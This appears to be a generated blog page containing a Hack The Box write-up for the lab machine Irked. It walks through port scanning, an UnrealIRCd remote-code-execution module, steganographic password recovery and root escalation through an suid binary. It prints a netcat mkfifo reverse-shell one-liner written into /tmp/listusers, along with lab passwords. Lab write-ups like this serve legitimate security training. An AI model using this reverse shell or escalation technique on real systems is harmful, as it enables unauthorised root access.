@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Hack The Box - Irked | 0xRick Owned Root !</title>
+<meta name="generator" content="Jekyll v3.7.4" />
+<meta property="og:title" content="Hack The Box - Irked" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Quick Summary Hey guys, today Irked retired and here’s my write-up about it. It was an easy straightforward machine, no rabbit holes and such things. To get an initial shell on the box we will exploit an RCE vulnerable irc server called UnrealIRCd. After getting a shell we will find a backup file which has a password. We will use that password to get a hidden text file from an image (steg). That text file contains another password which we will use to get ssh access as another user. Finally for privilege escalation there is an suid binary that executes a file, and we control that file so we can get a reverse shell as root. It’s a linux box and its ip is 10.10.10.117. I added it to /etc/hosts as irked.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC irked.htb There is ssh running on port 22 and http running on port 80. Let’s take a look at http. HTTP Initial Enumeration There is only that image and a message saying : IRC is almost working!, Source also has nothing interesting : We have a hint which is irc, let’s check that. If we didn’t find anything then we will continue with http. IRC I searched for irc and found here That if there is an irc server running on the machine, then probably it will be in the port range from 6000 to 7000. So I ran another nmap scan : nmap -p 6000-7000 -sV -sT -sC irked.htb There is an irc server running on port 6697 called UnrealIRCd. There are some known vulnerabilities for UnrealIRCd, One of them is a Remote Code Execution and there is a metasploit module for it : Let’s check if the server is vulnerable to it. It worked and we got a shell as ircd : Steg in irked.jpg, SSH as djmardov There are two users on the box : ircd and djmardov. I checked /home/ircd and there was nothing interesting. In /home/djmardov I didn’t find user.txt : I tried to go into .ssh but I got Permission denied : I checked other directories like Desktop, Downloads, Documents etc… And in Documents I found user.txt and a file called .backup : cat .backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss It gives us a hint about some steg backup, we also get something that looks like a password : UPupDOWNdownLRlrBAbaSSss. But where will we use that password ? Remember the image we saw earlier on that apache server ? I downloaded it then used steghide to check if there is any hidden file. Note : I have a list for some steganography tools, If you are not familiar with steg you can check it here. wget http://irked.htb/irked.jpg steghide info irked.jpg There is a hidden text file called pass.txt, Let’s extract it : steghide extract -sf irked.jpg cat pass.txt We got the password : Kab6h+m+bbp2J:HG, let’s try to login as djmardov : We owned user ! Exploiting viewuser, Privilege Escalation to root After some enumeration, I searched for suid binaries and in /usr/bin I found a binary called viewuser. find /usr/bin/ -perm -4000 It seems interesting so I decided to check it. viewuser It shows logged in users, but we don’t care about that. The only thing we care about is the last line : /tmp/listusers: 1: /tmp/listusers: djmardov: not found. It seems like it was trying to do something with the file /tmp/listusers which doesn’t exist. I downloaded viewuser to try some stuff : scp djmardov@irked.htb:/usr/bin/viewuser ./ When I did ltrace on the binary I found that it executes /tmp/listusers : And since this binary runs as root, then it also executes /tmp/listusers as root. So we can simply get a reverse shell by putting the payload in /tmp/listusers, Then after running the binary again it should execute the payload. echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f&quot; &gt; /tmp/listusers Everything is fine, let’s check our listener : Now we own root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Teacher" />
+<meta property="og:description" content="Quick Summary Hey guys, today Irked retired and here’s my write-up about it. It was an easy straightforward machine, no rabbit holes and such things. To get an initial shell on the box we will exploit an RCE vulnerable irc server called UnrealIRCd. After getting a shell we will find a backup file which has a password. We will use that password to get a hidden text file from an image (steg). That text file contains another password which we will use to get ssh access as another user. Finally for privilege escalation there is an suid binary that executes a file, and we control that file so we can get a reverse shell as root. It’s a linux box and its ip is 10.10.10.117. I added it to /etc/hosts as irked.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC irked.htb There is ssh running on port 22 and http running on port 80. Let’s take a look at http. HTTP Initial Enumeration There is only that image and a message saying : IRC is almost working!, Source also has nothing interesting : We have a hint which is irc, let’s check that. If we didn’t find anything then we will continue with http. IRC I searched for irc and found here That if there is an irc server running on the machine, then probably it will be in the port range from 6000 to 7000. So I ran another nmap scan : nmap -p 6000-7000 -sV -sT -sC irked.htb There is an irc server running on port 6697 called UnrealIRCd. There are some known vulnerabilities for UnrealIRCd, One of them is a Remote Code Execution and there is a metasploit module for it : Let’s check if the server is vulnerable to it. It worked and we got a shell as ircd : Steg in irked.jpg, SSH as djmardov There are two users on the box : ircd and djmardov. I checked /home/ircd and there was nothing interesting. In /home/djmardov I didn’t find user.txt : I tried to go into .ssh but I got Permission denied : I checked other directories like Desktop, Downloads, Documents etc… And in Documents I found user.txt and a file called .backup : cat .backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss It gives us a hint about some steg backup, we also get something that looks like a password : UPupDOWNdownLRlrBAbaSSss. But where will we use that password ? Remember the image we saw earlier on that apache server ? I downloaded it then used steghide to check if there is any hidden file. Note : I have a list for some steganography tools, If you are not familiar with steg you can check it here. wget http://irked.htb/irked.jpg steghide info irked.jpg There is a hidden text file called pass.txt, Let’s extract it : steghide extract -sf irked.jpg cat pass.txt We got the password : Kab6h+m+bbp2J:HG, let’s try to login as djmardov : We owned user ! Exploiting viewuser, Privilege Escalation to root After some enumeration, I searched for suid binaries and in /usr/bin I found a binary called viewuser. find /usr/bin/ -perm -4000 It seems interesting so I decided to check it. viewuser It shows logged in users, but we don’t care about that. The only thing we care about is the last line : /tmp/listusers: 1: /tmp/listusers: djmardov: not found. It seems like it was trying to do something with the file /tmp/listusers which doesn’t exist. I downloaded viewuser to try some stuff : scp djmardov@irked.htb:/usr/bin/viewuser ./ When I did ltrace on the binary I found that it executes /tmp/listusers : And since this binary runs as root, then it also executes /tmp/listusers as root. So we can simply get a reverse shell by putting the payload in /tmp/listusers, Then after running the binary again it should execute the payload. echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f&quot; &gt; /tmp/listusers Everything is fine, let’s check our listener : Now we own root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Teacher" />
+<link rel="canonical" href="http://localhost:4000/hack-the-box/irked/" />
+<meta property="og:url" content="http://localhost:4000/hack-the-box/irked/" />
+<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:image" content="http://localhost:4000/hackthebox/irked/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-04-27T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Hack The Box - Irked","dateModified":"2019-04-27T00:00:00+02:00","url":"http://localhost:4000/hack-the-box/irked/","datePublished":"2019-04-27T00:00:00+02:00","image":"http://localhost:4000/hackthebox/irked/0.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/irked/"},"description":"Quick Summary Hey guys, today Irked retired and here’s my write-up about it. It was an easy straightforward machine, no rabbit holes and such things. To get an initial shell on the box we will exploit an RCE vulnerable irc server called UnrealIRCd. After getting a shell we will find a backup file which has a password. We will use that password to get a hidden text file from an image (steg). That text file contains another password which we will use to get ssh access as another user. Finally for privilege escalation there is an suid binary that executes a file, and we control that file so we can get a reverse shell as root. It’s a linux box and its ip is 10.10.10.117. I added it to /etc/hosts as irked.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC irked.htb There is ssh running on port 22 and http running on port 80. Let’s take a look at http. HTTP Initial Enumeration There is only that image and a message saying : IRC is almost working!, Source also has nothing interesting : We have a hint which is irc, let’s check that. If we didn’t find anything then we will continue with http. IRC I searched for irc and found here That if there is an irc server running on the machine, then probably it will be in the port range from 6000 to 7000. So I ran another nmap scan : nmap -p 6000-7000 -sV -sT -sC irked.htb There is an irc server running on port 6697 called UnrealIRCd. There are some known vulnerabilities for UnrealIRCd, One of them is a Remote Code Execution and there is a metasploit module for it : Let’s check if the server is vulnerable to it. It worked and we got a shell as ircd : Steg in irked.jpg, SSH as djmardov There are two users on the box : ircd and djmardov. I checked /home/ircd and there was nothing interesting. In /home/djmardov I didn’t find user.txt : I tried to go into .ssh but I got Permission denied : I checked other directories like Desktop, Downloads, Documents etc… And in Documents I found user.txt and a file called .backup : cat .backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss It gives us a hint about some steg backup, we also get something that looks like a password : UPupDOWNdownLRlrBAbaSSss. But where will we use that password ? Remember the image we saw earlier on that apache server ? I downloaded it then used steghide to check if there is any hidden file. Note : I have a list for some steganography tools, If you are not familiar with steg you can check it here. wget http://irked.htb/irked.jpg steghide info irked.jpg There is a hidden text file called pass.txt, Let’s extract it : steghide extract -sf irked.jpg cat pass.txt We got the password : Kab6h+m+bbp2J:HG, let’s try to login as djmardov : We owned user ! Exploiting viewuser, Privilege Escalation to root After some enumeration, I searched for suid binaries and in /usr/bin I found a binary called viewuser. find /usr/bin/ -perm -4000 It seems interesting so I decided to check it. viewuser It shows logged in users, but we don’t care about that. The only thing we care about is the last line : /tmp/listusers: 1: /tmp/listusers: djmardov: not found. It seems like it was trying to do something with the file /tmp/listusers which doesn’t exist. I downloaded viewuser to try some stuff : scp djmardov@irked.htb:/usr/bin/viewuser ./ When I did ltrace on the binary I found that it executes /tmp/listusers : And since this binary runs as root, then it also executes /tmp/listusers as root. So we can simply get a reverse shell by putting the payload in /tmp/listusers, Then after running the binary again it should execute the payload. echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f&quot; &gt; /tmp/listusers Everything is fine, let’s check our listener : Now we own root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Teacher","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2');
+</script>
+
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Irked</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2019-04-27T00:00:00+02:00" itemprop="datePublished">Apr 27, 2019
+      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <hr />
+
+<h3 id="quick-summary">Quick Summary</h3>
+<h4 id="hey-guys-today-irked-retired-and-heres-my-write-up-about-it-it-was-an-easy-straightforward-machine-no-rabbit-holes-and-such-things-to-get-an-initial-shell-on-the-box-we-will-exploit-an-rce-vulnerable-irc-server-called-unrealircd-after-getting-a-shell-we-will-find-a-backup-file-which-has-a-password-we-will-use-that-password-to-get-a-hidden-text-file-from-an-image-steg-that-text-file-contains-another-password-which-we-will-use-to-get-ssh-access-as-another-user-finally-for-privilege-escalation-there-is-an-suid-binary-that-executes-a-file-and-we-control-that-file-so-we-can-get-a-reverse-shell-as-root-its-a-linux-box-and-its-ip-is-101010117-i-added-it-to-etchosts-as-irkedhtb-lets-jump-right-in-">Hey guys, today Irked retired and here’s my write-up about it. It was an easy straightforward machine, no rabbit holes and such things. To get an initial shell on the box we will exploit an RCE vulnerable irc server called <code class="highlighter-rouge">UnrealIRCd</code>. After getting a shell we will find a backup file which has a password. We will use that password to get a hidden text file from an image (steg). That text file contains another password which we will use to get ssh access as another user. Finally for privilege escalation there is an <code class="highlighter-rouge">suid</code> binary that executes a file, and we control that file so we can get a reverse shell as root. It’s a linux box and its ip is <code class="highlighter-rouge">10.10.10.117</code>. I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">irked.htb</code>. Let’s jump right in !</h4>
+<p><img src="/images/hackthebox/irked/0.png" alt="" /></p>
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with nmap to scan for open ports and services :</h4>
+<p><code class="highlighter-rouge">nmap -sV -sT -sC irked.htb</code>
+<img src="/images/hackthebox/irked/1.png" alt="" /></p>
+<h4 id="there-is-ssh-running-on-port-22-and-http-running-on-port-80-lets-take-a-look-at-http">There is ssh running on port 22 and http running on port 80. Let’s take a look at http.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="http-initial-enumeration">HTTP Initial Enumeration</h3>
+<p><img src="/images/hackthebox/irked/2.png" alt="" /></p>
+<h4 id="there-is-only-that-image-and-a-message-saying--irc-is-almost-working-source-also-has-nothing-interesting-">There is only that image and a message saying : <code class="highlighter-rouge">IRC is almost working!</code>, Source also has nothing interesting :</h4>
+<p><img src="/images/hackthebox/irked/3.png" alt="" /></p>
+<h4 id="we-have-a-hint-which-is-irc-lets-check-that-if-we-didnt-find-anything-then-we-will-continue-with-http">We have a hint which is irc, let’s check that. If we didn’t find anything then we will continue with http.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="irc">IRC</h3>
+<h4 id="i-searched-for-irc-and-found-here-that-if-there-is-an-irc-server-running-on-the-machine-then-probably-it-will-be-in-the-port-range-from-6000-to-7000-so-i-ran-another-nmap-scan-">I searched for irc and found <a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat#Technical_information">here</a> That if there is an irc server running on the machine, then probably it will be in the port range from 6000 to 7000. So I ran another nmap scan :</h4>
+<p><code class="highlighter-rouge">nmap -p 6000-7000 -sV -sT -sC irked.htb</code>
+<img src="/images/hackthebox/irked/4.png" alt="" /></p>
+<h4 id="there-is-an-irc-server-running-on-port-6697-called-unrealircd-there-are-some-known-vulnerabilities-for-unrealircd-one-of-them-is-a-remote-code-execution-and-there-is-a-metasploit-module-for-it-">There is an irc server running on port 6697 called <code class="highlighter-rouge">UnrealIRCd</code>. There are some known vulnerabilities for <code class="highlighter-rouge">UnrealIRCd</code>, One of them is a Remote Code Execution and there is a metasploit module for it :</h4>
+<p><img src="/images/hackthebox/irked/5.png" alt="" /></p>
+<h4 id="lets-check-if-the-server-is-vulnerable-to-it">Let’s check if the server is vulnerable to it.</h4>
+<p><img src="/images/hackthebox/irked/6.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/irked/7.png" alt="" /></p>
+<h4 id="it-worked-and-we-got-a-shell-as-ircd-">It worked and we got a shell as <code class="highlighter-rouge">ircd</code> :</h4>
+<p><img src="/images/hackthebox/irked/8.png" alt="" /></p>
+<hr />
+
+<h3 id="steg-in-irkedjpg-ssh-as-djmardov">Steg in <code class="highlighter-rouge">irked.jpg</code>, SSH as <code class="highlighter-rouge">djmardov</code></h3>
+<h4 id="there-are-two-users-on-the-box--ircd-and-djmardov-i-checked-homeircd-and-there-was-nothing-interesting-in-homedjmardov-i-didnt-find-usertxt-">There are two users on the box : <code class="highlighter-rouge">ircd</code> and <code class="highlighter-rouge">djmardov</code>. I checked <code class="highlighter-rouge">/home/ircd</code> and there was nothing interesting. In <code class="highlighter-rouge">/home/djmardov</code> I didn’t find <code class="highlighter-rouge">user.txt</code> :</h4>
+<p><img src="/images/hackthebox/irked/9.png" alt="" /></p>
+<h4 id="i-tried-to-go-into-ssh-but-i-got-permission-denied-">I tried to go into <code class="highlighter-rouge">.ssh</code> but I got <code class="highlighter-rouge">Permission denied</code> :</h4>
+<p><img src="/images/hackthebox/irked/10.png" alt="" /></p>
+<h4 id="i-checked-other-directories-like-desktop-downloads-documents-etc-and-in-documents-i-found-usertxt-and-a-file-called-backup-">I checked other directories like <code class="highlighter-rouge">Desktop</code>, <code class="highlighter-rouge">Downloads</code>, <code class="highlighter-rouge">Documents</code> etc… And in <code class="highlighter-rouge">Documents</code> I found <code class="highlighter-rouge">user.txt</code> and a file called <code class="highlighter-rouge">.backup</code> :</h4>
+<p><img src="/images/hackthebox/irked/11.png" alt="" />
+<br />
+<br />
+<code class="highlighter-rouge">cat .backup</code>
+<img src="/images/hackthebox/irked/12.png" alt="" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+</code></pre></div></div>
+<h4 id="it-gives-us-a-hint-about-some-steg-backup-we-also-get-something-that-looks-like-a-password--upupdowndownlrlrbabassss-but-where-will-we-use-that-password--remember-the-image-we-saw-earlier-on-that-apache-server-">It gives us a hint about some steg backup, we also get something that looks like a password : <code class="highlighter-rouge">UPupDOWNdownLRlrBAbaSSss</code>. But where will we use that password ? Remember the image we saw earlier on that apache server ?</h4>
+<p><img src="/images/hackthebox/irked/2.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/irked/3.png" alt="" /></p>
+<h4 id="i-downloaded-it-then-used-steghide-to-check-if-there-is-any-hidden-file">I downloaded it then used <code class="highlighter-rouge">steghide</code> to check if there is any hidden file.</h4>
+<h4 id="note--i-have-a-list-for-some-steganography-tools-if-you-are-not-familiar-with-steg-you-can-check-it-here">Note : I have a list for some steganography tools, If you are not familiar with steg you can check it <a href="/lists/stego">here</a>.</h4>
+<p><code class="highlighter-rouge">wget http://irked.htb/irked.jpg</code>
+<img src="/images/hackthebox/irked/13.png" alt="" />
+<br />
+<br />
+<code class="highlighter-rouge">steghide info irked.jpg</code>
+<img src="/images/hackthebox/irked/14.png" alt="" /></p>
+<h4 id="there-is-a-hidden-text-file-called-passtxt-lets-extract-it-">There is a hidden text file called <code class="highlighter-rouge">pass.txt</code>, Let’s extract it :</h4>
+<p><code class="highlighter-rouge">steghide extract -sf irked.jpg</code>
+<img src="/images/hackthebox/irked/15.png" alt="" />
+<br />
+<br />
+<code class="highlighter-rouge">cat pass.txt</code>
+<img src="/images/hackthebox/irked/16.png" alt="" /></p>
+<h4 id="we-got-the-password--kab6hmbbp2jhg-lets-try-to-login-as-djmardov-">We got the password : <code class="highlighter-rouge">Kab6h+m+bbp2J:HG</code>, let’s try to login as <code class="highlighter-rouge">djmardov</code> :</h4>
+<p><img src="/images/hackthebox/irked/17.png" alt="" /></p>
+<h4 id="we-owned-user-">We owned user !</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="exploiting-viewuser-privilege-escalation-to-root">Exploiting <code class="highlighter-rouge">viewuser</code>, Privilege Escalation to <code class="highlighter-rouge">root</code></h3>
+<h4 id="after-some-enumeration-i-searched-for-suid-binaries-and-in-usrbin-i-found-a-binary-called-viewuser">After some enumeration, I searched for <code class="highlighter-rouge">suid</code> binaries and in <code class="highlighter-rouge">/usr/bin</code> I found a binary called <code class="highlighter-rouge">viewuser</code>.</h4>
+<p><code class="highlighter-rouge">find /usr/bin/ -perm -4000</code>
+<img src="/images/hackthebox/irked/18.png" alt="" /></p>
+<h4 id="it-seems-interesting-so-i-decided-to-check-it">It seems interesting so I decided to check it.</h4>
+<p><code class="highlighter-rouge">viewuser</code>
+<img src="/images/hackthebox/irked/19.png" alt="" /></p>
+<h4 id="it-shows-logged-in-users-but-we-dont-care-about-that-the-only-thing-we-care-about-is-the-last-line--tmplistusers-1-tmplistusers-djmardov-not-found-it-seems-like-it-was-trying-to-do-something-with-the-file-tmplistusers-which-doesnt-exist-i-downloaded-viewuser-to-try-some-stuff-">It shows logged in users, but we don’t care about that. The only thing we care about is the last line : <code class="highlighter-rouge">/tmp/listusers: 1: /tmp/listusers: djmardov: not found</code>. It seems like it was trying to do something with the file <code class="highlighter-rouge">/tmp/listusers</code> which doesn’t exist. I downloaded <code class="highlighter-rouge">viewuser</code> to try some stuff :</h4>
+<p><code class="highlighter-rouge">scp djmardov@irked.htb:/usr/bin/viewuser ./</code>
+<img src="/images/hackthebox/irked/20.png" alt="" /></p>
+<h4 id="when-i-did-ltrace-on-the-binary-i-found-that-it-executes-tmplistusers-">When I did <code class="highlighter-rouge">ltrace</code> on the binary I found that it executes <code class="highlighter-rouge">/tmp/listusers</code> :</h4>
+<p><img src="/images/hackthebox/irked/21.png" alt="" /></p>
+<h4 id="and-since-this-binary-runs-as-root-then-it-also-executes-tmplistusers-as-root-so-we-can-simply-get-a-reverse-shell-by-putting-the-payload-in-tmplistusers-then-after-running-the-binary-again-it-should-execute-the-payload">And since this binary runs as root, then it also executes <code class="highlighter-rouge">/tmp/listusers</code> as root. So we can simply get a reverse shell by putting the payload in <code class="highlighter-rouge">/tmp/listusers</code>, Then after running the binary again it should execute the payload.</h4>
+<p><code class="highlighter-rouge">echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f" &gt; /tmp/listusers</code>
+<img src="/images/hackthebox/irked/22.png" alt="" /></p>
+<h4 id="everything-is-fine-lets-check-our-listener-">Everything is fine, let’s check our listener :</h4>
+<p><img src="/images/hackthebox/irked/23.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/irked/24.png" alt="" /></p>
+<h4 id="now-we-own-root-">Now we own root !</h4>
+<p><br />
+<br /></p>
+<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
+<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
+<h4 id="thanks-for-reading">Thanks for reading.</h4>
+<p><br />
+<br /></p>
+<h4 id="previous-hack-the-box-write-up--hack-the-box---teacher">Previous Hack The Box write-up : <a href="/hack-the-box/teacher/">Hack The Box - Teacher</a></h4>
+<hr />
+
+
+  </div>
+<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/irked/" hidden></a>
+</article>
+
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">0xRick Owned Root !</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">0xRick Owned Root !</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
+
